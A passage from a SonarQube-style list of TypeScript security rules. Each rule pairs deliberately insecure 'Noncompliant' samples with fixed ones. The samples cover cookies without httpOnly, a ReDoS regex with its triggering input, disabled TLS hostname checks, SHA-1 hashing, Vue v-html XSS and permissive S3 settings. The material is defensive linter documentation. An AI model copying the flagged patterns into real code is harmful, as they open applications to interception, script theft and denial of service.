<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  httpOnly: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { httpOnly: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  httpOnly: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    httpOnly: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  httpOnly: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { httpOnly: true }}); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4784">
              typescript:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5852&amp;rule_key&#61;javascript%3AS5852" rel="nofollow">S5852</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a&#43;)&#43;s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2" rel="nofollow">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
const regex &#61; /(a&#43;)&#43;b/; // Sensitive
const regex2 &#61; new RegExp(&#34;(a&#43;)&#43;b&#34;); // Sensitive

str.search(&#34;(a&#43;)&#43;b&#34;); // Sensitive
str.match(&#34;(a&#43;)&#43;b&#34;); // Sensitive
str.split(&#34;(a&#43;)&#43;b&#34;); // Sensitive
</pre>
<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5759">
              typescript:S5759
            </a>
          </td>
          <td>
            <details>
              <p>Users often connect to web servers through HTTP proxies.</p>
<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>
<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for
examples.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://github.com/http-party/node-http-proxy" rel="nofollow">node-http-proxy</a></p>
<pre>
var httpProxy &#61; require(&#39;http-proxy&#39;);

httpProxy.createProxyServer({target:&#39;http://localhost:9000&#39;, xfwd:true}) // Noncompliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware" rel="nofollow">http-proxy-middleware</a></p>
<pre>
var express &#61; require(&#39;express&#39;);

const { createProxyMiddleware } &#61; require(&#39;http-proxy-middleware&#39;);

const app &#61; express();

app.use(&#39;/proxy&#39;, createProxyMiddleware({ target: &#39;http://localhost:9000&#39;, changeOrigin: true, xfwd: true })); // Noncompliant
app.listen(3000);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://github.com/http-party/node-http-proxy" rel="nofollow">node-http-proxy</a></p>
<pre>
var httpProxy &#61; require(&#39;http-proxy&#39;);

// By default xfwd option is false
httpProxy.createProxyServer({target:&#39;http://localhost:9000&#39;}) // Compliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware" rel="nofollow">http-proxy-middleware</a></p>
<pre>
var express &#61; require(&#39;express&#39;);

const { createProxyMiddleware } &#61; require(&#39;http-proxy-middleware&#39;);

const app &#61; express();

// By default xfwd option is false
app.use(&#39;/proxy&#39;, createProxyMiddleware({ target: &#39;http://localhost:9000&#39;, changeOrigin: true})); // Compliant
app.listen(3000);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For" rel="nofollow">developer.mozilla.org</a> - X-Forwarded-For </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6281">
              typescript:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul><li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li><li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li><li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li><li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li></ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li><li> Many users have the permission to set ACL or policy to the S3 bucket. </li><li> These settings are not already enforced to true at the account level. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul><li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li><li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li><li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li><li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;
}); // Sensitive
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : false, // Sensitive
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL
});
</pre>
<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : true,
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" rel="nofollow">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html" rel="nofollow">AWS CDK version 2</a> - BlockPublicAccess </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2255">
              typescript:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-11639" rel="nofollow">CVE-2018-11639</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-6537" rel="nofollow">CVE-2016-6537</a> </li></ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sensitive information is stored inside the cookie. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies" rel="nofollow">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Built-in NodeJS modules &#61;&#61;&#61;
const http &#61; require(&#39;http&#39;);
const https &#61; require(&#39;https&#39;);

http.createServer(function(req, res) {
  res.setHeader(&#39;Set-Cookie&#39;, [&#39;type&#61;ninja&#39;, &#39;lang&#61;js&#39;]); // Sensitive
});
https.createServer(function(req, res) {
  res.setHeader(&#39;Set-Cookie&#39;, [&#39;type&#61;ninja&#39;, &#39;lang&#61;js&#39;]); // Sensitive
});
</pre>
<pre>
// &#61;&#61;&#61; ExpressJS &#61;&#61;&#61;
const express &#61; require(&#39;express&#39;);
const app &#61; express();
app.use(function(req, res, next) {
  res.cookie(&#39;name&#39;, &#39;John&#39;); // Sensitive
});
</pre>
<pre>
// &#61;&#61;&#61; In browser &#61;&#61;&#61;
// Set cookie
document.cookie &#61; &#34;name&#61;John&#34;; // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE" rel="nofollow">COOKIE_USAGE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2817">
              typescript:S2817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h3>Noncompliant code example</h3>
<pre>
var db &#61; window.openDatabase(&#34;myDb&#34;, &#34;1.0&#34;, &#34;Personal secrets stored here&#34;, 2*1024*1024);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5527">
              typescript:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4790">
              typescript:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
const crypto &#61; require(&#34;crypto&#34;);

const hash &#61; crypto.createHash(&#39;sha1&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const crypto &#61; require(&#34;crypto&#34;);

const hash &#61; crypto.createHash(&#39;sha512&#39;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6299">
              typescript:S6299
            </a>
          </td>
          <td>
            <details>
              <p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like
<code>innerText</code> instead of <code>innerHtml</code>.</p>
<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will
introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or
impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<p>The application needs to render HTML content which:</p>
<ul><li> could be user-controlled and not previously sanitized. </li><li> is difficult to understand how it was constructed. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as
  possible on built-in auto-escaping Vue.js features. </li><li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript
  (<code>javascript:onClick(...)</code>). </li><li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>
<pre>
&lt;div v-html&#61;&#34;htmlContent&#34;&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
Vue.component(&#39;element&#39;, {
  render: function (createElement) {
    return createElement(
      &#39;div&#39;,
      {
        domProps: {
          innerHTML: this.htmlContent, // Noncompliant
        }
      }
    );
  },
});
</pre>
<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
&lt;div domPropsInnerHTML&#61;{this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{<!-- -->{ htmlContent }}&lt;/div&gt;
</pre>
<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>
<pre>
Vue.component(&#39;element&#39;, {
  render: function (createElement) {
    return createElement(
      &#39;div&#39;,
      {
        domProps: {
          innerText: this.htmlContent,
        }
      },
      this.htmlContent // Child node
    );
  },
});
</pre>
<p>When using JSX, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{this.htmlContent}&lt;/div&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://vuejs.org/v2/guide/security.html#Injecting-HTML" rel="nofollow">Vue.js - Security - Injecting HTML</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6304">
              typescript:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
